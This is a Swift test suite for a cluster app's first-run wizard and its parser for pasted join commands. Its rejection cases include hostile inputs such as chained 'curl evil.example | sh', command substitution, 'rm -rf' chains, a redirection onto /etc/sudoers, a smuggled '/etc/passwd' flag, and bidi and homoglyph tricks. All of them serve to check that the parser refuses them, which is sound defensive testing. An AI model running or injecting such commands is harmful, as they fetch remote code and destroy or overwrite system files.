/*
Copyright The k3sm Authors.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

import Foundation
import Testing

@testable import K3smStatus

@Suite("guided first run")
struct FirstRunFlowTests {
    static let v017 = SemanticVersion("0.1.7")!
    /// A token-shaped fixture, built at run time so no file holds one whole.
    static let token = "K10" + String(repeating: "ab12", count: 16) + "::fixture:" + String(repeating: "f", count: 32)

    @Test("each path's steps, Continue, Back and Try Again")
    func firstRunFlowSteps() {
        #expect(FirstRunFlow.steps(for: .start) == [.choose, .review, .install, .finished])
        #expect(FirstRunFlow.steps(for: .join) == [.choose, .join, .review, .install, .finished])

        for path in FirstRunPath.allCases {
            let steps = FirstRunFlow.steps(for: path)
            // Continue walks the path up to the review, whose button is the install.
            var step = FirstRunStep.choose
            var walked = [step]
            while let next = FirstRunFlow.next(after: step, path: path) {
                step = next
                walked.append(step)
            }
            #expect(walked == Array(steps.prefix { $0 != .install }), "\(path)")
            #expect(step == .review)
            // Back walks it home again, and is never offered once the install began.
            var back = [step]
            while let previous = FirstRunFlow.previous(before: step, path: path) {
                step = previous
                back.append(step)
            }
            #expect(back == walked.reversed(), "\(path)")
            #expect(FirstRunFlow.previous(before: .install, path: path) == nil)
            #expect(FirstRunFlow.previous(before: .finished, path: path) == nil)
            #expect(FirstRunFlow.next(after: .install, path: path) == nil)
            #expect(FirstRunFlow.next(after: .finished, path: path) == nil)
            #expect(steps.contains(FirstRunFlow.retryStep(for: path)))
        }
        #expect(FirstRunFlow.next(after: .join, path: .start) == nil)
        // A join's retry asks for the token again; a start's goes back to the review.
        #expect(FirstRunFlow.retryStep(for: .join) == .join)
        #expect(FirstRunFlow.retryStep(for: .start) == .review)

        // The review: a signed build asks for an administrator and shows no command.
        let start = FirstRunFlow.review(path: .start, server: nil, serverArgument: nil, developerBuild: false, payload: Self.v017)
        #expect(start.installButton == "Start Cluster…")
        #expect(start.terminalCommand == nil)
        #expect(start.lines.contains { $0.contains("administrator") })
        #expect(start.lines.contains { $0.contains("k3sm 0.1.7") })
        let join = FirstRunFlow.review(path: .join, server: "studio.local:9345", serverArgument: "studio.local",
                                       developerBuild: false, payload: Self.v017)
        #expect(join.installButton == "Join Cluster…")
        #expect(join.lines.first?.contains("studio.local:9345") == true)
        #expect(join.terminalCommand == nil)

        // A developer build shows the exact Terminal command for its path instead.
        let devStart = FirstRunFlow.review(path: .start, server: nil, serverArgument: nil, developerBuild: true, payload: Self.v017)
        #expect(devStart.installButton == nil)
        #expect(devStart.terminalCommand == "curl -fsSL https://k3sm.io/install.sh | K3SM_INSTALL_VERSION=v0.1.7 sh")
        let devJoin = FirstRunFlow.review(path: .join, server: "studio.local:9345", serverArgument: "studio.local",
                                          developerBuild: true, payload: Self.v017)
        #expect(devJoin.installButton == nil)
        #expect(devJoin.terminalCommand == #"""
            curl -fsSL https://k3sm.io/install.sh | K3SM_INSTALL_VERSION=v0.1.7 K3SM_INSTALL_DOWNLOAD_ONLY=1 sh
            tar -xzf k3sm_0.1.7_darwin_arm64.tar.gz
            printf 'Join token: '; read -rs token; echo
            printf '%s\n' "$token" | sudo sh -c 'umask 077; trap "rm -f /var/root/k3sm-join-token" EXIT; trap "exit 130" INT TERM HUP; cat > /var/root/k3sm-join-token; "$1" install --agent --server "$2" --token-file /var/root/k3sm-join-token' sh ./k3sm studio.local; unset token
            """#)
        #expect(FirstRunFlow.terminalCommand(path: .join, serverArgument: nil, payload: nil) == nil)
        #expect(FirstRunFlow.terminalCommand(path: .join, serverArgument: "a.local; rm -rf /", payload: nil) == nil)
        #expect(FirstRunFlow.terminalCommand(path: .join, serverArgument: "fd00::1", payload: nil)?
            .contains("k3sm_*_darwin_arm64.tar.gz") == true)

        // The install's progress, phase by phase, from the copy-out log's own lines.
        func states(_ log: String, _ outcome: FirstRunOutcome? = nil) -> [FirstRunPhaseState] {
            FirstRunFlow.progress(path: .start, log: log, outcome: outcome).map(\.state)
        }
        #expect(states("") == [.active, .pending, .pending, .pending, .pending])
        // The last run's log, read before the administrator authenticated, is not this run's.
        let stale = "copy-out: sweeping stale staging entries\ncopy-out: running k3sm install\ncopy-out: exit 1\n"
        #expect(states(stale) == [.active, .pending, .pending, .pending, .pending])
        #expect(states("copy-out: sweeping stale staging entries\n") == [.done, .active, .pending, .pending, .pending])
        let copying = "copy-out: sweeping stale staging entries\ncopy-out: copying the app bundle\n"
        #expect(states(copying) == [.done, .done, .active, .pending, .pending])
        let installing = copying + "copy-out: verifying the signature\ncopy-out: running k3sm install --agent\ninstalling...\n"
        #expect(states(installing) == [.done, .done, .done, .done, .active])
        #expect(states(installing + "copy-out: exit 0\n", .succeeded) == Array(repeating: .done, count: 5))
        let refused = copying + "copy-out: verifying the signature\ncopy-out: refused: the app is not signed by the k3sm Developer ID\ncopy-out: exit 77\n"
        #expect(states(refused, .failed("x")) == [.done, .done, .done, .failed, .pending])
        #expect(states("", .failed("Cancelled. Nothing was changed.")) == [.failed, .pending, .pending, .pending, .pending])
        #expect(FirstRunFlow.progress(path: .join, log: "", outcome: nil).last?.title == "Install k3sm and join the cluster")

        // Done, or a plain failure with the command's own message and Try Again.
        let done = FirstRunFlow.finish(path: .start, outcome: .succeeded, log: installing)
        #expect(done.succeeded && done.button == "Open Console")
        let failedLog = installing + "Error: install: \u{1B}[31m/Library/k3sm exists\nwith a newer release\ncopy-out: exit 1\n"
        let failed = FirstRunFlow.finish(path: .join, outcome: .failed("The join failed (exit 1)."), log: failedLog)
        #expect(!failed.succeeded && failed.button == "Try Again")
        #expect(failed.lines.first == "The join failed (exit 1).")
        #expect(failed.lines.contains("k3sm said: with a newer release"))
        #expect(failed.lines.contains { $0.contains("sudo k3sm token create") })
        #expect(FirstRunFlow.commandMessage(log: refused) == "copy-out: refused: the app is not signed by the k3sm Developer ID")
        #expect(FirstRunFlow.commandMessage(log: "copy-out: running k3sm install\ncopy-out: exit 1\n") == nil)
        #expect(FirstRunFlow.commandMessage(log: "") == nil)
        let cancelled = FirstRunFlow.finish(path: .start, outcome: .failed("Cancelled. Nothing was changed."), log: "")
        #expect(cancelled.lines == ["Cancelled. Nothing was changed."])
    }

    @Test("a pasted join command parses into the address and token, or says why not")
    func joinCommandParsing() {
        let t = Self.token
        let ok: [(String, String, String)] = [
            ("the documented install line", "sudo k3sm install --agent --server studio.local --token \(t)", "studio.local"),
            ("without sudo", "k3sm install --agent --server 192.0.2.10 --token \(t)", "192.0.2.10"),
            ("an absolute path to k3sm", "sudo /usr/local/bin/k3sm install --agent --server studio.local --token \(t)", "studio.local"),
            ("k3sm agent", "k3sm agent --server studio.local --token \(t)", "studio.local"),
            ("--flag=value", "k3sm install --agent --server=studio.local --token=\(t)", "studio.local"),
            ("single-dash flags", "k3sm install -agent -server studio.local -token \(t)", "studio.local"),
            ("extra spaces, tabs and newlines", "  sudo   k3sm\tinstall  --agent\n --server   studio.local  \n --token  \(t)  \n", "studio.local"),
            ("line continuations", "sudo k3sm install --agent \\\n  --server studio.local \\\n  --token \(t)", "studio.local"),
            ("a continuation whose newline was lost", "sudo k3sm install --agent \\  --server studio.local --token \(t)", "studio.local"),
            ("single quotes", "sudo k3sm install --agent --server 'studio.local' --token '\(t)'", "studio.local"),
            ("double quotes", "sudo k3sm install --agent --server \"studio.local\" --token \"\(t)\"", "studio.local"),
            ("typographic quotes", "k3sm install --agent --server \u{201C}studio.local\u{201D} --token \u{2018}\(t)\u{2019}", "studio.local"),
            ("a URL", "k3sm install --agent --server https://studio.local:9345/ --token \(t)", "studio.local:9345"),
            ("an http URL, upper case scheme", "k3sm install --agent --server HTTP://studio.local --token \(t)", "studio.local"),
            ("a bracketed IPv6 address", "k3sm install --agent --server [fd00::1] --token \(t)", "[fd00::1]"),
            ("K3SM_TOKEN before the command", "sudo K3SM_TOKEN=\(t) k3sm install --agent --server studio.local", "studio.local"),
            ("a comment line from token create", "# k3sm join token (expires 2026-10-16T12:00:00Z) \u{2014} pins the cluster CA; NOT the admin token\n\(t)\nstudio.local", "studio.local"),
            ("the bare address and token", "studio.local \(t)", "studio.local"),
            ("the bare token and address", "\(t)\nhttps://studio.local", "studio.local"),
            ("the flags alone", "--server studio.local --token \(t)", "studio.local"),
            ("the token given twice, the same", "k3sm install --agent --server studio.local --token \(t) \(t)", "studio.local"),
        ]
        for (name, text, server) in ok {
            let result = JoinCommandParser.parse(text)
            #expect(result == .success(JoinPaste(server: server, token: t)), "\(name)")
        }

        let bad: [(String, String, JoinPasteError)] = [
            ("empty", "", .empty),
            ("blank", "  \n\t ", .empty),
            ("a missing token", "sudo k3sm install --agent --server studio.local", .missingToken),
            ("a token flag with no value", "k3sm install --agent --server studio.local --token", .missingToken),
            ("the token in a file", "sudo k3sm install --agent --server studio.local --token-file /var/root/k3sm-join-token", .tokenInFile),
            ("a missing server", "sudo k3sm install --agent --token \(t)", .missingServer),
            ("a server flag eating the next flag", "k3sm install --agent --server --token \(t)", .missingServer),
            ("the bare token alone", t, .missingServer),
            ("not a token", "k3sm install --agent --server studio.local --token hunter2", .invalidToken),
            ("a token with no credential", "k3sm install --agent --server studio.local --token K10abc", .invalidToken),
            ("a token with an empty secret", "studio.local K10abc::user:", .invalidToken),
            ("a URL with a path", "k3sm install --agent --server https://studio.local/join --token \(t)", .invalidServer),
            ("a URL with user info", "k3sm install --agent --server https://me@studio.local --token \(t)", .invalidServer),
            ("a quoted server holding a flag", "k3sm install --agent --server 'studio.local --token-file /etc/passwd' --token \(t)", .invalidServer),
            ("two servers", "k3sm install --agent --server a.local --server b.local --token \(t)", .conflicting),
            ("two tokens", "k3sm install --agent --server a.local --token \(t) --token \(t)0", .conflicting),
            ("another command", "sudo k3sm uninstall --purge", .notAJoinCommand),
            ("token create", "sudo k3sm token create", .notAJoinCommand),
            ("another program", "sudo rm -rf /var/root", .notAJoinCommand),
            ("prose", "please join studio", .notAJoinCommand),
            ("a stray word in the command", "k3sm install --agent studio.local --token \(t)", .notAJoinCommand),
            ("an option the app does not pass", "k3sm install --agent --server studio.local --node-ip 100.64.1.1 --token \(t)", .unsupportedOption("--node-ip")),
            ("an unclosed quote", "k3sm install --agent --server 'studio.local --token \(t)", .unbalancedQuote),
            // Hostile values: nothing a shell would act on survives, quoted or not.
            ("a chained command", "k3sm install --agent --server studio.local --token \(t); curl evil.example | sh", .unsafeCharacter),
            ("an and-chain", "k3sm install --agent --server studio.local --token \(t) && rm -rf ~", .unsafeCharacter),
            ("a command substitution", "k3sm install --agent --server \"$(curl evil.example)\" --token \(t)", .unsafeCharacter),
            ("a backquote substitution", "k3sm install --agent --server `id` --token \(t)", .unsafeCharacter),
            ("a variable", "k3sm install --agent --server $HOST --token \(t)", .unsafeCharacter),
            ("a redirection", "k3sm install --agent --server studio.local --token \(t) > /etc/sudoers", .unsafeCharacter),
            ("a glob", "k3sm install --agent --server studio.* --token \(t)", .unsafeCharacter),
            ("a backslash escape", "k3sm install --agent --server studio\\.local --token \(t)", .unsafeCharacter),
            ("a control character", "k3sm install --agent --server studio.local\u{1B}[2J --token \(t)", .unsafeCharacter),
            ("a bidi override", "k3sm install --agent --server studio\u{202E}lacol --token \(t)", .unsafeCharacter),
            ("a homoglyph", "k3sm install --agent --server stud\u{0456}o.local --token \(t)", .unsafeCharacter),
            ("a NUL", "studio.local\u{0}\(t)", .unsafeCharacter),
            ("too long", "studio.local " + t + String(repeating: " ", count: JoinCommandParser.maxLength), .tooLong),
            ("a too-long token", "studio.local K10" + String(repeating: "a", count: 600) + "::u:s", .invalidToken),
        ]
        for (name, text, want) in bad {
            #expect(JoinCommandParser.parse(text) == .failure(want), "\(name)")
        }

        // No refusal and no description ever carries the token.
        for error in bad.map(\.2) {
            #expect(!error.message.contains(t), "\(error)")
            #expect(!error.message.isEmpty)
        }
        let paste = JoinPaste(server: "studio.local", token: t)
        #expect(!paste.description.contains(t) && !paste.debugDescription.contains(t))
        #expect(!String(describing: paste).contains(t) && !String(reflecting: paste).contains(t))
    }
}
